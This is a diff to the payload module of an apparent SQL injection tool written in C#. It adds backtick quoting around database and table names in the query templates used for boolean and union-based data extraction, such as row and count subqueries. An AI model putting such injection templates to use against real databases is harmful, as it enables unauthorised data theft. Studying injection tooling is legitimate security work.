@@ -61,13 +61,13 @@ namespace SuperSQLInjection.payload
         public static String bool_ord_value = " " + mid_value + ">{len}";
 
         //获取行数据bool
-        public static String data_value = "(select {columns} from {dbname}.{table} limit {index},1)";
+        public static String data_value = "(select {columns} from `{dbname}`.`{table}` limit {index},1)";
 
         //获取数据bool,加入orderby解决获取数据时，获取到的数据每一行可能不对称的可能
-        public static String data_value_orderBy = "(select {columns} from {dbname}.{table} order by {orderby} limit {index},1)";
+        public static String data_value_orderBy = "(select {columns} from `{dbname}`.`{table}` order by {orderby} limit {index},1)";
 
         //union获取数据条数
-        public static String data_count = "(select count(*) from {dbname}.{table})";
+        public static String data_count = "(select count(*) from `{dbname}`.`{table}`)";
 
         //bool判断数据条数
         public static String bool_datas_count = " " + data_count + ">={len}";
@@ -125,7 +125,7 @@ namespace SuperSQLInjection.payload
 
             if (!Tools.checkEmpty(dbName))
             {
-                sb.Append(" from " + dbName + ".");
+                sb.Append(" from `" + dbName + "`.");
                 if (!Tools.checkEmpty(table))
                 {
                     sb.Append(table);
@@ -136,7 +136,7 @@ namespace SuperSQLInjection.payload
             {
                 if (!Tools.checkEmpty(table))
                 {
-                    sb.Append(" from " + table);
+                    sb.Append(" from `" + table+ "`");
                 }
             }
             if (limit >= 0)
@@ -194,7 +194,7 @@ namespace SuperSQLInjection.payload
 
             if (!Tools.checkEmpty(dbName))
             {
-                sb.Append(" from " + dbName + ".");
+                sb.Append(" from `" + dbName + "`.");
                 if (!Tools.checkEmpty(table))
                 {
                     sb.Append(table);
@@ -204,7 +204,7 @@ namespace SuperSQLInjection.payload
             {
                 if (!Tools.checkEmpty(table))
                 {
-                    sb.Append(" from " + table);
+                    sb.Append(" from `" + table+ "`");
                 }
             }
             if (limit >= 0)
@@ -229,7 +229,7 @@ namespace SuperSQLInjection.payload
 
             if (!Tools.checkEmpty(dbName))
             {
-                sb.Append(" from " + dbName + ".");
+                sb.Append(" from `" + dbName + "`.");
                 if (!Tools.checkEmpty(table))
                 {
                     sb.Append(table);
@@ -239,7 +239,7 @@ namespace SuperSQLInjection.payload
             {
                 if (!Tools.checkEmpty(table))
                 {
-                    sb.Append(" from " + table);
+                    sb.Append(" from `" + table+ "`");
                 }
             }
             if (limit >= 0)
@@ -265,7 +265,7 @@ namespace SuperSQLInjection.payload
             sb.Append(")");
             if (!Tools.checkEmpty(dbName))
             {
-                sb.Append(" from " + dbName + ".");
+                sb.Append(" from `" + dbName + "`.");
                 if (!Tools.checkEmpty(table))
                 {
                     sb.Append(table);
@@ -275,7 +275,7 @@ namespace SuperSQLInjection.payload
             {
                 if (!Tools.checkEmpty(table))
                 {
-                    sb.Append(" from " + table);
+                    sb.Append(" from `" + table+ "`");
                 }
             }
             if (limit >= 0)
